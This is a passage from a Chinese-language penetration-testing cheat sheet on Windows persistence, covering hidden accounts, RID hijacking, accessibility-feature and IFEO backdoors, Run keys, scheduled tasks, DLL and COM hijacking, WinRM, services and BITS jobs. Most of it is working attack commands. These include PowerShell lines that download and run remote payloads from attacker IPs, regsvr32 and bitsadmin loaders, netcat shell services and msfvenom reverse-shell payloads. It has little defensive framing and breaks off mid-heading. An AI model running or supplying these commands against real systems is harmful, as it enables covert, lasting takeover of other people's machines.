SAM的完全控制和读取的权限\n以下导出为1.reg\nHKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\Names\\test$\n记录HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\Names\\test$的默认类型000003EA\n以下导出为2.reg\nHKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\000003EA\n默认administrator默认类型为000001F4\n以下导出为3.reg\nHKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\000001F4\n把000001F4(3.reg)的F值粘贴到000003EA(2.reg)的F值\n修改后导入\n&gt;regedit /s 1.reg\n&gt;regedit /s 2.reg\n删除net user test$ /del\nPowershell脚本\nhttps://github.com/3gstudent/Windows-User-Clone/blob/master/Windows-User-Clone.ps1\n需system权限\n&gt;Create-Clone -u 要创建的 -p 密码 -cu 想要克隆的\n</code></pre>\n<p><img data-src=\"448.png\" alt=\"\" /><br />\n<img data-src=\"449.png\" alt=\"\" /></p>\n<h3 id=\"rid劫持\"><a class=\"anchor\" href=\"#rid劫持\">#</a> RID 劫持</h3>\n<pre><code>利用场景：\n激活guest修改rid为管理员的\n修改低权限用户rid\n劫持rid之前普通用户1的rid值\n</code></pre>\n<p><img data-src=\"450.png\" alt=\"\" /></p>\n<pre><code>使用msf的post/windows/manage/rid_hijack模块\n</code></pre>\n<p><img data-src=\"451.png\" alt=\"\" /></p>\n<pre><code>运行后可以看到已经变为超管的rid值\n</code></pre>\n<p><img data-src=\"452.png\" alt=\"\" /></p>\n<pre><code>此时普通用户1登录系统是为超管权限\n</code></pre>\n<h3 id=\"guest激活\"><a class=\"anchor\" href=\"#guest激活\">#</a> Guest 激活</h3>\n<pre><code>激活来宾账户，修改其密码，加入administrators组\n&gt;net user guest /active:yes\n&gt;net user guest 123qwe!@#\n&gt;net localgroup administrators guest /ad\n</code></pre>\n<h3 id=\"映像劫持-2\"><a class=\"anchor\" href=\"#映像劫持-2\">#</a> 映像劫持</h3>\n<h2 id=\"-589\"><a class=\"anchor\" href=\"#-589\">#</a> </h2>\n<h2 id=\"sethc\"><a class=\"anchor\" href=\"#sethc\">#</a> Sethc</h2>\n<pre><code>&gt;move sethc.exe 1.exe\n&gt;copy cmd.exe sethc.exe\n5下shift调用cmd\n</code></pre>\n<h2 id=\"-590\"><a class=\"anchor\" href=\"#-590\">#</a> </h2>\n<h2 id=\"轻松使用\"><a class=\"anchor\" href=\"#轻松使用\">#</a> 轻松使用</h2>\n<pre><code>注册表\n计算机\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\\n新建Utilman.exe，新建字符串值Debugger,指定为C:\\Windows\\System32\\cmd.exe\n&gt; REG ADD &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\utilman.exe&quot; /t REG_SZ /v Debugger /d &quot;C:\\windows\\system32\\cmd.exe&quot; /f\n</code></pre>\n<h2 id=\"-591\"><a class=\"anchor\" href=\"#-591\">#</a> </h2>\n<h2 id=\"ifeo静默执行\"><a class=\"anchor\" href=\"#ifeo静默执行\">#</a> IFEO 静默执行</h2>\n<pre><code>计算机\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe 新建DWORD值GlobalFlag 16进制为200\n创建：计算机\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\sethc.exe字符串值：MonitorProcess=muma.exe\nDWORD值ReportingMode=1\n&gt;reg add &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe&quot; /f\n&gt;reg add &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe&quot; /v GlobalFlag /t REG_DWORD /d 512 /f\n&gt;reg add &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\sethc.exe&quot; /v ReportingMode /t REG_DWORD /d 1  /f\n&gt;reg add &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\sethc.exe&quot; /v MonitorProcess /t REG_SZ /d &quot;c:\\windows\\system32\\cmd.exe&quot; /f\n</code></pre>\n<h3 id=\"注册表启动项\"><a class=\"anchor\" href=\"#注册表启动项\">#</a> 注册表启动项</h3>\n<pre><code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\n</code></pre>\n<h2 id=\"-592\"><a class=\"anchor\" href=\"#-592\">#</a> </h2>\n<h2 id=\"msf-10\"><a class=\"anchor\" href=\"#msf-10\">#</a> MSF</h2>\n<pre><code>添加一个监听\nMeterpreter&gt; reg setval -k HKLM\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\run -v nc -d 'C:\\windows\\system32\\nc.exe -Ldp 444 -e cmd.exe'\n查询是否添加成功\nMeterpreter&gt; reg queryval -k HKLM\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\Run -v nc\nMeterpreter&gt; reg enumkey -k HKLM\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\run\n开启防火墙进站规则\n&gt; netsh firewall add portopening TCP 444 &quot;name&quot; ENABLE ALL\n重启\n&gt; shutdown -r -t 0\n</code></pre>\n<h2 id=\"-593\"><a class=\"anchor\" href=\"#-593\">#</a> </h2>\n<h2 id=\"cmd-5\"><a class=\"anchor\" href=\"#cmd-5\">#</a> CMD</h2>\n<pre><code>查看注册表启动项\n&gt;REG query &quot;HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run&quot;\n添加启动项\n&gt;REG ADD &quot;HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run&quot; /V &quot;windowsupdate&quot; /t REG_SZ /F /D &quot;c:\\windows\\temp\\update.exe&quot;\n删除启动项\n&gt;REG delete &quot;HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run&quot; /V &quot;windowsupdate&quot; /f\n</code></pre>\n<h3 id=\"计划任务-2\"><a class=\"anchor\" href=\"#计划任务-2\">#</a> 计划任务</h3>\n<h2 id=\"-594\"><a class=\"anchor\" href=\"#-594\">#</a> </h2>\n<h2 id=\"加载powershell\"><a class=\"anchor\" href=\"#加载powershell\">#</a> 加载 powershell</h2>\n<pre><code>&gt;schtasks /Create /tn 名字 /tr 运行程序 /sc hourly /mo 1\n&gt;schtasks /create /S TARGET /SC Weekly /RU &quot;NT Authority\\SYSTEM&quot; /TN &quot;STCheck&quot; /TR &quot;powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://192.168.0.107:8080/Invoke-PowerShellTcp.ps1''')'&quot;\n</code></pre>\n<h2 id=\"-595\"><a class=\"anchor\" href=\"#-595\">#</a> </h2>\n<h2 id=\"执行exe\"><a class=\"anchor\" href=\"#执行exe\">#</a> 执行 exe</h2>\n<pre><code>创建计划任务\n&gt;schtasks /create /RL HIGHEST /F /tn &quot;windowsupdate&quot; /tr &quot;c:\\windows\\temp\\update.exe&quot; /sc DAILY /mo 1 /ST 12:25 /RU SYSTEM\n查看计划任务\n&gt;schtasks /query | findstr &quot;windowsupdate&quot;\n立即执行某项计划任务\n&gt;schtasks /run /tn &quot;windowsupdate&quot;\n删除某项计划任务\n&gt;schtasks /delete /F /tn &quot;windowsupdate&quot;\n普通用户权限计划任务\n&gt;schtasks /create /F /tn &quot;windowsupdate&quot; /tr &quot;D:\\user\\zhangsan\\file\\windowsupdate.exe&quot; /sc DAILY /mo 1 /ST 12:25 \n&gt;schtasks /query | findstr &quot;windowsupdate&quot; \n&gt;schtasks /run /tn &quot;windowsupdate&quot; \n&gt;schtasks /delete /F /tn &quot;windowsupdate&quot; \n&gt;schtasks /tn &quot;SysDebug&quot; /query /fo list /v\n</code></pre>\n<h3 id=\"进程注入\"><a class=\"anchor\" href=\"#进程注入\">#</a> 进程注入</h3>\n<h2 id=\"-596\"><a class=\"anchor\" href=\"#-596\">#</a> </h2>\n<h2 id=\"appcertdlls\"><a class=\"anchor\" href=\"#appcertdlls\">#</a> AppCertDlls</h2>\n<pre><code>注册表HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\SessionManager\\下新建AppCertDlls，新建名字为Default，值为c:\\1.dll的项\n#msfvenom –p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 –f dll &gt;/root/1.dll\nMsf&gt;use exploit/multi/handler\nMsf&gt;set payload windows/meterpreter/reverse_tcp\nhttps://cdn.securityxploded.com/download/RemoteDLLInjector.zip\n&gt; RemoteDLLInjector64.exe PID c:\\1.dll\n</code></pre>\n<h2 id=\"-597\"><a class=\"anchor\" href=\"#-597\">#</a> </h2>\n<h2 id=\"appinit_dlls\"><a class=\"anchor\" href=\"#appinit_dlls\">#</a> AppInit_DLLs</h2>\n<pre><code>注册表HKEY_LOCAL_MACHINE\\Software\\Microsoft\\WindowsNT\\CurrentVersion\\Window\\Appinit_Dlls下AppInit_DLLs设置为c:\\1.dll，LoadAppInit_DLLs设置为1\n</code></pre>\n<h2 id=\"-598\"><a class=\"anchor\" href=\"#-598\">#</a> </h2>\n<h2 id=\"msf-11\"><a class=\"anchor\" href=\"#msf-11\">#</a> MSF</h2>\n<pre><code>Msf&gt;use post/windows/manage/reflective_dll_inject\nMsf&gt;set session 1\nMsf&gt;set pid 1234\nMsf&gt;set path c:\\\\1.dll\nMsf&gt;run\n&amp;\nmigrate +pid\n&amp;\nMeterpreter&gt;run post/windows/manage/migrate\n</code></pre>\n<h3 id=\"登录初始化\"><a class=\"anchor\" href=\"#登录初始化\">#</a> 登录初始化</h3>\n<pre><code>计算机\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon下添加Userinit值\n&gt;Powershell.exe Set-ItemProperty &quot;HKLM:\\SOFTWARE\\Microsoft\\WINDOWS NT\\CurrentVersion\\Winlogon&quot; -name Userinit -value &quot;C:\\Windows\\system32\\userinit.exe,c:\\muma.exe&quot;\n计算机\\HKEY_CURRENT_USER\\Environment\n创建键值UserInitMprLogonScript值为c:\\muma.exe\n&amp;\nPowershell实现：\n&gt;Set-ExecutionPolicy RemoteSigned \n保存ps1执行\nSet-ItemProperty &quot;HKLM:\\SOFTWARE\\Microsoft\\WINDOWS NT\\CurrentVersion\\Winlogon&quot; -name Userinit -value &quot;C:\\Windows\\system32\\userinit.exe,powershell.exe -nop -w hidden -c $w=new-object net.webclient;$w.proxy=[Net.WebRequest]::GetSystemWebProxy();$w.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $w.downloadstring('http://192.168.2.11:8080/kaMhC1');&quot;\n# powershell反弹shell的payload参照msf中的web_delivery模块\n</code></pre>\n<h2 id=\"-599\"><a class=\"anchor\" href=\"#-599\">#</a> </h2>\n<h2 id=\"屏幕保护程序\"><a class=\"anchor\" href=\"#屏幕保护程序\">#</a> 屏幕保护程序</h2>\n<pre><code>计算机\\HKEY_CURRENT_USER\\Control Panel\\Desktop\nSCRNSAVE.EXE - 默认屏幕保护程序，改为恶意程序(设置备份)\nScreenSaveActive - 1表示屏幕保护是启动状态，0表示表示屏幕保护是关闭状态\nScreenSaverTimeout - 指定屏幕保护程序启动前系统的空闲事件，单位为秒，默认为900（15分钟）\n</code></pre>\n<h3 id=\"mof\"><a class=\"anchor\" href=\"#mof\">#</a> MOF</h3>\n<pre><code>&gt;git clone https://github.com/khr0x40sh/metasploit-modules.git\n&gt;mv metasploit-modules/persistence/mof_ps_persist.rb /usr/share/metasploit-framework/modules/post/windows/\n&gt;reload_all\n&gt;use post/windows/mof_ps_persist\n&gt;set payload windows/x64/meterpreter/reverse_tcp\n&gt;set lhost 192.168.0.108\n&gt;set lport 12345\n&gt;set session 1\n&gt;run\n</code></pre>\n<p><img data-src=\"453.png\" alt=\"\" /></p>\n<pre><code>&gt;use exploit/multi/handler\n&gt;set payload windows/x64/meterpreter/reverse_tcp\n&gt;set lhost 192.168.0.108\n&gt;set lport 12345\n&gt;set exitonsession false\n</code></pre>\n<p><img data-src=\"454.png\" alt=\"\" /></p>\n<pre><code>重启后还会上线\n</code></pre>\n<p><img data-src=\"455.png\" alt=\"\" /></p>\n<pre><code>清除后门，进入meterpreter，resource 生成的rc文件\n停止MOF\n&gt;net stop winmgmt\n删除文件夹：C:\\WINDOWS\\system32\\wbem\\Repository\\\n&gt;net start winmgmt \n</code></pre>\n<h3 id=\"winrm端口复用\"><a class=\"anchor\" href=\"#winrm端口复用\">#</a> WinRM 端口复用</h3>\n<pre><code>WinRM端口5985，win2012以上默认启动，2008开启命令\n&gt;winrm quickconfig -q\n2012启用端口复用\n&gt;winrm set winrm/config/service @&#123;EnableCompatibilityHttpListener=&quot;true&quot;&#125;\n2008启用WinRM后修改端口为80\n&gt;winrm set winrm/config/Listener?Address=*+Transport=HTTP @&#123;Port=&quot;80&quot;&#125;\n后门连接和使用\n本地开启WinRM并设置信任连接主机\n&gt;winrm quickconfig -q\n&gt;winrm set winrm/config/Client @&#123;TrustedHosts=&quot;*&quot;&#125;\n执行命令\n&gt;winrs -r:http://10.1.1.100 -u:administrator -p:password ipconfig /all\n获取cmdshell\n&gt;winrs -r:http://10.1.1.100 -u:administrator -p:password cmd\n</code></pre>\n<p><img data-src=\"456.png\" alt=\"\" /></p>\n<pre><code>只administrator允许远程登录WinRM，允许其他用户可以登录，执行注册表\n&gt;reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f\n</code></pre>\n<h3 id=\"创建服务\"><a class=\"anchor\" href=\"#创建服务\">#</a> 创建服务</h3>\n<pre><code>重启维持nc\n&gt;sc create ms binpath= &quot;cmd /K start c:\\nc\\nc64.exe -d 192.168.0.51 4567 -e cmd.exe&quot; start= delayed-auto error= ignore\n重启维持psh\n#msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.107 LPORT=11111 -f psh-reflection &gt;/var/www/html/xxx.ps1\n&gt;sc create ms binpath= &quot;cmd /K start C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -exec bypass -c \\&quot;IEX(New-Object net.webclient).DownloadString('http://192.168.0.107/xxx.ps1')\\&quot;&quot; start= delayed-auto error= ignore\n</code></pre>\n<p><img data-src=\"457.png\" alt=\"\" /></p>\n<pre><code>重启维持Cobalt strike\n配置监听器，生成web传递模块Powershell脚本\n&gt;sc create ms binpath= &quot;cmd /K start C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -w hidden -c \\&quot;IEX ((new-object net.webclient).downloadstring('http://192.168.0.107:8080/a'))\\&quot;&quot; start= delayed-auto error= ignore\n</code></pre>\n<p><img data-src=\"458.png\" alt=\"\" /></p>\n<pre><code>Delay执行大概2分钟上线\n&gt;sc delete ms 卸载服务\nPowershell\n&gt;powershell.exe new-service -Name nuoyani -BinaryPathName &quot;C:\\WINDOWS\\Temp\\360.exe&quot; -StartupType Automatic\n&gt;$c2='new-';$c3='service -Name nuoyani -DisplayName OrderServ -BinaryPathName &quot;C:\\accc.exe&quot; -StartupType Automatic'; $Text=$c2+$c3;IEX(-join $Text)\n</code></pre>\n<h3 id=\"bitadmin\"><a class=\"anchor\" href=\"#bitadmin\">#</a> Bitadmin</h3>\n<pre><code>创建下载任务\n&gt;bitsadmin /create empire\n下载的文件设置\n&gt;bitsadmin /addfile empire %comspec% c:\\windows\\temp\\1.exe\n设置传输时运行的命令,MSFvenom生成dll放入temp目录\n&gt;bitsadmin /SetNotifyCmdLine empire cmd.exe &quot;cmd.exe /c rundll32 c:\\windows\\temp\\1.dll,0&quot;\n(bitsadmin /SetNotifyCmdLine backdoor regsvr32.exe &quot;/u /s /i:https://x.com/shell.sct scrobj.dll&quot;)\n启动任务\n&gt;bitsadmin /resume empire\n列出所有用户的下载任务\n&gt;bitsadmin /list /allusers /verbose\n</code></pre>\n<p><img data-src=\"459.png\" alt=\"\" /></p>\n<pre><code>重启后也会上线\n</code></pre>\n<p><img data-src=\"460.png\" alt=\"\" /></p>\n<pre><code>完成任务\n&gt;bitsadmin /complete empire\n&gt;bitsadmin /cancel &lt;Job&gt; //删除某个任务\n&gt;bitsadmin /reset /allusers //删除所有任务\n&amp;\n&gt;bitsadmin /create mission\n&gt;bitsadmin /addfile mission %comspec% %temp%\\cmd.exe\n&gt;bitsadmin.exe /SetNotifyCmdLine mission regsvr32.exe &quot;/u /s /i:http://192.168.0.107/shell.sct scrobj.dll&quot;\n&gt;bitsadmin /Resume mission\n</code></pre>\n<h3 id=\"clr-injection\"><a class=\"anchor\" href=\"#clr-injection\">#</a> CLR Injection</h3>\n<pre><code>劫持调用.net程序，开机启动\nhttps://github.com/3gstudent/CLR-Injection/blob/master/CLR-Injection_x64.bat\n</code></pre>\n<p><img data-src=\"461.png\" alt=\"\" /><br />\n<img data-src=\"462.png\" alt=\"\" /></p>\n<pre><code>WMIC可替换为powershell\nNew-ItemProperty &quot;HKCU:\\Environment\\&quot; COR_ENABLE_PROFILING -value &quot;1&quot; -propertyType string | Out-Null\nNew-ItemProperty &quot;HKCU:\\Environment\\&quot; COR_PROFILER -value &quot;&#123;11111111-1111-1111-1111-111111111111&#125;&quot; -propertyType string | Out-Null\n\nwmic ENVIRONMENT create name=&quot;COR_ENABLE_PROFILING&quot;,username=&quot;%username%&quot;,VariableValue=&quot;1&quot;\nwmic ENVIRONMENT create name=&quot;COR_PROFILER&quot;,username=&quot;%username%&quot;,VariableValue=&quot;&#123;11111111-1111-1111-1111-111111111111&#125;&quot;\ncertutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg.dll\ncertutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg.dll delete\ncertutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg_x64.dll\ncertutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg_x64.dll delete\nSET KEY=HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\&#123;11111111-1111-1111-1111-111111111111&#125;\\InProcServer32\nREG.EXE ADD %KEY% /VE /T REG_SZ /D &quot;%CD%\\msg_x64.dll&quot; /F\nREG.EXE ADD %KEY% /V ThreadingModel /T REG_SZ /D Apartment /F \nSET KEY=HKEY_CURRENT_USER\\Software\\Classes\\WoW6432Node\\CLSID\\&#123;11111111-1111-1111-1111-111111111111&#125;\\InProcServer32\nREG.EXE ADD %KEY% /VE /T REG_SZ /D &quot;%CD%\\msg.dll&quot; /F\nREG.EXE ADD %KEY% /V ThreadingModel /T REG_SZ /D Apartment /F\n添加全局变量\n计算机\\HKEY_CURRENT_USER\\Environment\nCOR_ENABLE_PROFILING=1\nCOR_PROFILER=&#123;11111111-1111-1111-1111-111111111111&#125;\n注册CLSID\n计算机\\HKEY_CURRENT_USER\\Software\\Classes\\CLSID添加项&#123;11111111-1111-1111-1111-111111111111&#125;和它的子项InprocServer32\n新建一个键ThreadingModel，键值为：Apartment，默认键值为dll路径\n劫持explorer.exe\n&gt;SET COR_ENABLE_PROFILING=1\n&gt;SET COR_PROFILER=&#123;11111111-1111-1111-1111-111111111111&#125;\n位置(新建)\nHKEY_CURRENT_USER\\Software\\Classes\\CLSID\\&#123;42aedc87-2188-41fd-b9a3-0c966feabec1&#125;\\InprocServer32默认值为恶意DLL\n新建ThreadingModel值为Apartment\n</code></pre>\n<h3 id=\"com-object-hijacking\"><a class=\"anchor\" href=\"#com-object-hijacking\">#</a> COM OBJECT hijacking</h3>\n<h2 id=\"-600\"><a class=\"anchor\" href=\"#-600\">#</a> </h2>\n<h2 id=\"caccpropservicesclass-and-mmdeviceenumerato\"><a class=\"anchor\" href=\"#caccpropservicesclass-and-mmdeviceenumerato\">#</a> CAccPropServicesClass and MMDeviceEnumerato</h2>\n<pre><code>无需超管权限，无需重启\nhttps://github.com/3gstudent/COM-Object-hijacking\n将恶意DLLbase64编码写入ps脚本\n</code></pre>\n<p><img data-src=\"463.png\" alt=\"\" /><br />\n<img data-src=\"464.png\" alt=\"\" /></p>\n<pre><code>执行后会在\n%appdata%\\Microsoft\\Installer\\&#123;BCDE0395-E52F-467C-8E3D-C4579291692E&#125;目录释放2个文件，分别是x86和x64的dll\n会在注册表中\nHKEY_CURRENT_USER\\Software\\Classes\\CLSID\\\n新建\n&#123;b5f8350b-0548-48b1-a6ee-88bd00b4a5e7&#125;和子项默认指向恶意DLL\n只要指向.net程序便可上线。如ie，mmc等\n</code></pre>\n<p><img data-src=\"465.png\" alt=\"\" /></p>\n<h2 id=\"-601\"><a class=\"anchor\" href=\"#-601\">#</a> </h2>\n<h2 id=\"explorer\"><a class=\"anchor\" href=\"#explorer\">#</a> Explorer</h2>\n<pre><code>注册表位置：HKCU\\Software\\Classes\\CLSID\\\n创建项&#123;42aedc87-2188-41fd-b9a3-0c966feabec1&#125;\n创建子项InprocServer32\nDefault的键值为恶意dll的绝对路径：C:\\test\\1.dll\n创建键值： ThreadingModel REG_SZ Apartment\n</code></pre>\n<p><img data-src=\"466.png\" alt=\"\" /></p>\n<pre><code>HKCU\\Software\\Classes\\CLSID&#123;42aedc87-2188-41fd-b9a3-0c966feabec1&#125;\nHKCU\\Software\\Classes\\CLSID&#123;fbeb8a05-beee-4442-804e-409d6c4515e9&#125;\nHKCU\\Software\\Classes\\CLSID&#123;b5f8350b-0548-48b1-a6ee-88bd00b4a5e7&#125;\nHKCU\\Software\\Classes\\Wow6432Node\\CLSID&#123;BCDE0395-E52F-467C-8E3D-C4579291692E&#125;\n</code></pre>\n<h3 id=\"squibledoo\"><a class=\"anchor\" href=\"#squibledoo\">#</a> Squibledoo</h3>\n<pre><code>创建1.sct\n</code></pre>\n<figure class=\"highlight xml\"><figcaption data-lang=\"XML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token prolog\">&lt;?XML version=\"1.0\"?></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>scriptlet</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>registration</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token attr-name\">description</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>Component<span class=\"token punctuation\">\"</span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token attr-name\">progid</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>Component.WindowsUpdate<span class=\"token punctuation\">\"</span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token attr-name\">version</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>1.00<span class=\"token punctuation\">\"</span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token attr-name\">classid</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>&#123;20002222-0000-0000-0000-000000000002&#125;<span class=\"token punctuation\">\"</span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>registration</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre> </pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>public</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>method</span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>exec<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>method</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>public</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span> <span class=\"token attr-name\">language</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>JScript<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token cdata\">&lt;![CDATA[</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    function exec()&#123;</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>      new ActiveXObject('WScript.Shell').Run('calc.exe');</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    &#125;</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  ]]></span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>scriptlet</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><pre><code>创建COM对象\n&gt;regsvr32.exe /s /i:http://192.168.0.107/1.sct scrobj.dll\n触发\n&gt;cscript 1.js\nvar test = new ActiveXObject(&quot;Component.TESTCB&quot;);\ntest.exec()\n</code></pre>\n<h3 id=\"dll劫持-2\"><a class=\"anchor\" href=\"#dll劫持-2\">#</a> DLL 劫持</h3>\n<h2 id=\"-602\"><a class=\"anchor\" href=\"#-602\">#</a> </h2>\n<h2 id=\"劫持1\"><a class=\"anchor\" href=\"#劫持1\">#</a> 劫持 1</h2>\n<pre><code>注册表\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SessionManager\\ExcludeFromKnownDlls下添加 &quot;lpk.dll&quot;(若无，自己创建)\nExcludeFromKnownDlls可使KnownDLLs失效\n需要重新启动电脑\n查找可劫持的DLL：\n1.启动程序\n2.使用Process Explorer查看该应用程序启动后加载的DLL。\n3.从已经加载的DLL列表中，查找在上述“KnownDLLs注册表项”中不存在的DLL。\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLs\n4.编写第三步中获取到的DLL的劫持DLL。\n5.将编写好的劫持DLL放到该应用程序目录下，重新启动该应用程序，检测是否劫持成功。\n</code></pre>\n<p><img data-src=\"467.png\" alt=\"\" /></p>\n<pre><code>Explorer.exe启动调用winrar文件夹的RarExt.dll\nMsf监听\n</code></pre>\n<p><img data-src=\"468.png\" alt=\"\" /></p>\n<pre><code>复制dll文件到the-backdoor-factory文件夹中，加载恶意dll进原dll\n&gt;python backdoor.py -f RarExt.dll -s reverse_shell_tcp_inline -P 12138 -H 192.168.0.107 指定为kali监听的IP和端口\n</code></pre>\n<p><img data-src=\"469.png\" alt=\"\" /></p>\n<pre><code>生成好的dll在backdoored文件夹，传入靶机中，替换原dll文件，最好把原dll保存备份。\n每次打开windows资源管理器的时候，即可上线。重启可维持\n</code></pre>\n<p><img data-src=\"470.png\" alt=\"\" /></p>\n<h2 id=\"-603\"><a class=\"anchor\" href=\"#-603\">#</a> </h2>\n<h2 id=\"劫持2\"><a class=\"anchor\" href=\"#劫持2\">#</a> 劫持 2</h2>\n<pre><code>使用\nhttps://github.com/coca1ne/DLL_Hijacker\nhttps://github.com/git20150901/DLLHijack_Detecter\n查看要劫持的DLL的函数导出表，会直接生成cpp源码，重编译指向恶意代码\nDLLHijack_Detecter可查看程序加载的不在KnownDLLs中的DLL\n</code></pre>\n<h2 id=\"-604\"><a class=\"anchor\" href=\"#-604\">#</a> </h2>\n<h2 id=\"msdtc服务劫持\"><a class=\"anchor\" href=\"#msdtc服务劫持\">#</a> MSDTC 服务劫持</h2>\n<pre><code>服务名称MSDTC,显示名称Distributed Transaction Coordinator\n对应进程msdtc.exe,位于%windir%system32\nC:\\Windows\\System32\\wbem\\\n服务启动搜索注册表位置计算机\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\MSDTC\\MTxOCI\n#msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.51 LPORT=4444 -f dll -o /var/www/html/oci.dll\nOci.dll放入c:\\windows\\system32\\\n重启服务即可\n&gt;taskkill /f /im msdtc.exe\n</code></pre>\n<h2 id=\"-605\"><a class=\"anchor\" href=\"#-605\">#</a> </h2>\n<h2 id=\"rattler\"><a class=\"anchor\" href=\"#rattler\">#</a> 